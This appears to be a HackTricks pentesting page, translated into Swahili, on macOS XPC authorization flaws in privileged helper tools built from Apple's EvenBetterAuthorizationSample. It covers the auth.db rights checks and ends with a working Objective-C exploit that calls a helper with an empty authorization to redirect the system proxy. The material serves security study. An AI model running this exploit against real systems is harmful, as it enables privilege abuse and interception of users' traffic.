# macOS XPC Authorization

{{#include ../../../../../banners/hacktricks-training.md}}

## XPC Authorization

Apple pia inapendekeza njia nyingine ya kuthibitisha ikiwa mchakato unaounganisha una **idhini za kuita njia ya XPC iliyo wazi**.

Wakati programu inahitaji **kutekeleza vitendo kama mtumiaji mwenye mamlaka**, badala ya kuendesha programu kama mtumiaji mwenye mamlaka, kawaida huweka kama root HelperTool kama huduma ya XPC ambayo inaweza kuitwa kutoka kwa programu ili kutekeleza vitendo hivyo. Hata hivyo, programu inayoiita huduma inapaswa kuwa na idhini ya kutosha.

### ShouldAcceptNewConnection kila wakati YES

Mfano unaweza kupatikana katika [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Katika `App/AppDelegate.m` inajaribu **kuunganisha** na **HelperTool**. Na katika `HelperTool/HelperTool.m` kazi **`shouldAcceptNewConnection`** **haitakagua** yoyote ya mahitaji yaliyoelezwa hapo awali. Itarudisha kila wakati YES:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Kwa maelezo zaidi kuhusu jinsi ya kusanidi ipasavyo hii angalia:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Haki za programu

Hata hivyo, kuna **idhini inayofanyika wakati njia kutoka kwa HelperTool inaitwa**.

Kazi **`applicationDidFinishLaunching`** kutoka `App/AppDelegate.m` itaunda rejeleo tupu la idhini baada ya programu kuanza. Hii inapaswa kufanya kazi kila wakati.\
Kisha, itajaribu **kuongeza haki fulani** kwa rejeleo hilo la idhini kwa kuita `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
Kazi `setupAuthorizationRights` kutoka `Common/Common.m` itahifadhi katika hifadhidata ya uthibitisho `/var/db/auth.db` haki za programu. Kumbuka jinsi itakavyoongeza tu haki ambazo bado hazipo katika hifadhidata:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
Kazi `enumerateRightsUsingBlock` ndiyo inayotumika kupata ruhusa za programu, ambazo zimefafanuliwa katika `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Hii inamaanisha kwamba mwishoni mwa mchakato huu, ruhusa zilizotangazwa ndani ya `commandInfo` zitawekwa katika `/var/db/auth.db`. Angalia jinsi kuna **kila njia** ambayo itahitaji **uthibitisho**, **jina la ruhusa** na **`kCommandKeyAuthRightDefault`**. Ya mwisho **inaonyesha ni nani anaweza kupata haki hii**.

Kuna maeneo tofauti kuonyesha ni nani anaweza kufikia haki. Baadhi yao zimefafanuliwa katika [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (unaweza kupata [zote hapa](https://www.dssw.co.uk/reference/authorization-rights/)), lakini kwa muhtasari:

<table><thead><tr><th width="284.3333333333333">Jina</th><th width="165">Thamani</th><th>Maelezo</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>ruhusu</td><td>Mtu yeyote</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>kata</td><td>Hakuna mtu</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>ni-admin</td><td>Mtumiaji wa sasa anahitaji kuwa admin (ndani ya kundi la admin)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Muulize mtumiaji kuthibitisha.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Muulize mtumiaji kuthibitisha. Anahitaji kuwa admin (ndani ya kundi la admin)</td></tr><tr><td>kAuthorizationRightRule</td><td>kanuni</td><td>Fafanua sheria</td></tr><tr><td>kAuthorizationComment</td><td>maoni</td><td>Fafanua maoni ya ziada juu ya haki</td></tr></tbody></table>

### Uthibitishaji wa Haki

Katika `HelperTool/HelperTool.m` kazi **`readLicenseKeyAuthorization`** inakagua ikiwa mpiga simu ameidhinishwa **kutekeleza njia hiyo** kwa kuita kazi **`checkAuthorization`**. Kazi hii itakagua **authData** iliyotumwa na mchakato unaoitwa ina **muundo sahihi** na kisha itakagua **kila kinachohitajika kupata haki** ya kuita njia maalum. Ikiwa kila kitu kinaenda vizuri **`error` iliyorejeshwa itakuwa `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Kumbuka kwamba ili **kuangalia mahitaji ya kupata** haki ya kuita njia hiyo, kazi `authorizationRightForCommand` itakagua tu kitu cha maoni kilichotajwa awali **`commandInfo`**. Kisha, itaita **`AuthorizationCopyRights`** kuangalia **kama ina haki** ya kuita kazi hiyo (kumbuka kwamba bendera zinaruhusu mwingiliano na mtumiaji).

Katika kesi hii, ili kuita kazi `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` imewekwa kuwa `@kAuthorizationRuleClassAllow`. Hivyo **mtu yeyote anaweza kuita**.

### Taarifa za DB

Ilitajwa kwamba taarifa hii inahifadhiwa katika `/var/db/auth.db`. Unaweza kuorodhesha sheria zote zilizohifadhiwa kwa:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Kisha, unaweza kusoma ni nani anaweza kufikia haki hiyo kwa:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Haki za Permissive

Unaweza kupata **mipangilio yote ya ruhusa** [**hapa**](https://www.dssw.co.uk/reference/authorization-rights/), lakini mchanganyiko ambao hautahitaji mwingiliano wa mtumiaji ungekuwa:

1. **'authenticate-user': 'false'**
- Hii ni funguo ya moja kwa moja zaidi. Ikiwa imewekwa kuwa `false`, inaashiria kwamba mtumiaji hatahitaji kutoa uthibitisho ili kupata haki hii.
- Hii inatumika kwa **mchanganyiko na moja ya 2 hapa chini au kuashiria kundi** ambalo mtumiaji lazima awe sehemu yake.
2. **'allow-root': 'true'**
- Ikiwa mtumiaji anafanya kazi kama mtumiaji wa root (ambaye ana ruhusa za juu), na funguo hii imewekwa kuwa `true`, mtumiaji wa root anaweza kupata haki hii bila uthibitisho zaidi. Hata hivyo, kwa kawaida, kufikia hadhi ya mtumiaji wa root tayari kunahitaji uthibitisho, hivyo hii si hali ya "hakuna uthibitisho" kwa watumiaji wengi.
3. **'session-owner': 'true'**
- Ikiwa imewekwa kuwa `true`, mmiliki wa kikao (mtumiaji aliyeingia sasa) atapata haki hii moja kwa moja. Hii inaweza kupita uthibitisho wa ziada ikiwa mtumiaji tayari ameingia.
4. **'shared': 'true'**
- Funguo hii haitoi haki bila uthibitisho. Badala yake, ikiwa imewekwa kuwa `true`, inamaanisha kwamba mara haki hiyo itakapothibitishwa, inaweza kushirikiwa kati ya michakato mingi bila kila mmoja kuhitaji kuthibitishwa tena. Lakini utoaji wa awali wa haki hiyo bado unahitaji uthibitisho isipokuwa ikichanganywa na funguo nyingine kama `'authenticate-user': 'false'`.

Unaweza [**kutumia skripti hii**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) kupata haki za kuvutia:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## Kurejesha Idhini

### Kuangalia kama EvenBetterAuthorization inatumika

Ikiwa unapata kazi: **`[HelperTool checkAuthorization:command:]`** inawezekana mchakato unatumia mpangilio ulioelezwa hapo awali kwa ajili ya idhini:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Hii, ikiwa kazi hii inaita kazi kama `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree`, inatumia [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Angalia **`/var/db/auth.db`** kuona kama inawezekana kupata ruhusa za kuita hatua fulani yenye mamlaka bila mwingiliano wa mtumiaji.

### Mawasiliano ya Itifaki

Kisha, unahitaji kupata mpangilio wa itifaki ili uweze kuanzisha mawasiliano na huduma ya XPC.

Kazi **`shouldAcceptNewConnection`** inaonyesha itifaki inayotolewa:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Katika kesi hii, tuna sawa na katika EvenBetterAuthorizationSample, [**angalia mstari huu**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Kujua, jina la itifaki inayotumika, inawezekana **kudondosha ufafanuzi wa kichwa chake** na:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Mwisho, tunahitaji tu kujua **jina la Huduma ya Mach iliyo wazi** ili kuanzisha mawasiliano nayo. Kuna njia kadhaa za kuipata hii:

- Katika **`[HelperTool init]`** ambapo unaweza kuona Huduma ya Mach inayotumika:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- Katika plist ya launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Mfano wa Kutumia

Katika mfano huu umeundwa:

- Ufafanuzi wa itifaki na kazi zake
- Auth tupu ya kutumia kuomba ufikiaji
- Muunganisho na huduma ya XPC
- Kuitwa kwa kazi ikiwa muunganisho ulikuwa na mafanikio
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Msaada mwingine wa XPC uliofanywa matumizi mabaya

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)

## Marejeleo

- [https://theevilbit.github.io/posts/secure_coding_xpc_part1/](https://theevilbit.github.io/posts/secure_coding_xpc_part1/)

{{#include ../../../../../banners/hacktricks-training.md}}
